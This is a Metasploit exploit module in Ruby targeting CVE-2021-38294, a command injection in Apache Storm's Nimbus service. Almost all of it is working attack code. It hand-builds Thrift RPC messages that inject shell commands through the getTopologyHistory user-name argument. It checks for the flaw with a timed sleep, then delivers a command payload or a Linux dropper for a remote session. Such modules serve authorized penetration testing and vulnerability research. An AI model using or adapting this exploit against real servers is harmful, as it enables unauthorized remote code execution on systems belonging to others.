##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '',
        'Description' => %q{
          This module exploits a command injection vulnerability within the Nimbus service's getTopologyHistory RPC
          method. The method takes a single argument which is the name of a user which is concatenated into a string
          that is executed by bash. In order for the vulnerability to be exploitable, there must have been at least one
          topology submitted to the server. The topology may be active or inactive, but at least one must be present.
        },
        'Author' => [
          'Alvaro MuÃ±oz', # discovery and original research
          'Spencer McIntyre', # metasploit module
        ],
        'References' => [
          ['CVE', '2021-38294'],
          ['URL', 'https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/']
        ],
        'DisclosureDate' => '2021-10-28',
        'License' => MSF_LICENSE,
        'Platform' => ['linux', 'unix'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper
            }
          ]
        ],
        'DefaultTarget' => 1,
        'DefaultOptions' => {
          'RPORT' => 6627,
          'MeterpreterTryToFork' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def stopwatch
    # https://blog.dnsimple.com/2018/03/elapsed-time-with-ruby-the-right-way/
    start = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    ret = yield
    elapsed = Process.clock_gettime(Process::CLOCK_MONOTONIC) - start

    [ret, elapsed]
  end

  def check
    begin
      connect
    rescue Rex::ConnectionError
      return CheckCode::Unknown('Failed to connect to the service.')
    end

    sleep_time = rand(5..10)
    response, elapsed_time = stopwatch do
      execute_command("sleep #{sleep_time}", { disconnect: false })
      recv_response(sleep_time + 5)
    end
    disconnect

    vprint_status("Elapsed time: #{elapsed_time} seconds")

    unless response && elapsed_time > sleep_time
      return CheckCode::Safe('Failed to test command injection.')
    end

    CheckCode::Appears('Successfully tested command injection.')
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def execute_command(cmd, opts = {})
    # comment out the rest of the command to ensure it's only executed once and prefix a random tag to avoid caching
    cmd = "#{cmd} ##{Rex::Text.rand_text_alphanumeric(4..8)}"
    vprint_status("Executing command: #{cmd}")

    send_request([
      Thrift::Header.new(message_type: Thrift::MessageType::CALL, method_name: 'getTopologyHistory'),
      Thrift::Data.new(data_type: Thrift::DataType::T_UTF7, field_id: 1, data_value: ";#{cmd}"),
      Thrift::Data.new
    ].map(&:to_binary_s).join)
    disconnect if opts.fetch(:disconnect, true)
  end

  def send_request(request)
    connect if sock.nil?
    sock.put([ request.length ].pack('N') + request)
  end

  def recv_response(timeout)
    remaining = timeout
    res_size, elapsed = stopwatch do
      sock.timed_read(4, remaining)
    end

    remaining -= elapsed
    return nil if res_size.nil? || res_size.length != 4 || remaining <= 0

    res, = stopwatch do
      sock.timed_read(res_size.unpack1('N'), remaining)
    end

    return nil if res.nil? || res.length != res_size.unpack1('N')

    return res_size + res
  rescue Timeout::Error
    return nil
  end

  module Thrift
    class DataType < BinData::Uint8
      T_STOP = 0
      T_UTF7 = 11

      default_parameter assert: -> { !DataType.name(value).nil? }

      def self.name(value)
        constants.select { |c| c.upcase == c }.find { |c| const_get(c) == value }
      end

      def to_sym
        self.class.name(value)
      end
    end

    class MessageType < BinData::Uint16be
      CALL = 1
      REPLY = 2

      default_parameter assert: -> { !MessageType.name(value).nil? }

      def self.name(value)
        constants.select { |c| c.upcase == c }.find { |c| const_get(c) == value }
      end

      def to_sym
        self.class.name(value)
      end
    end

    class Header < BinData::Record
      endian :big

      uint16       :version, initial_value: 0x8001
      message_type :message_type
      uint32       :method_name_length, value: -> { method_name.length }
      string       :method_name, read_length: :method_name_length
      uint32       :sequence_id
    end

    class Data < BinData::Record
      endian :big

      data_type :data_type, initial_value: DataType::T_STOP
      uint16    :field_id, onlyif: -> { data_type != DataType::T_STOP }
      uint32    :data_length, onlyif: -> { data_type != DataType::T_STOP }, value: -> { data_value.length }
      choice    :data_value, onlyif: -> { data_type != DataType::T_STOP }, selection: :data_type do
        string DataType::T_UTF7
      end
    end
  end
end
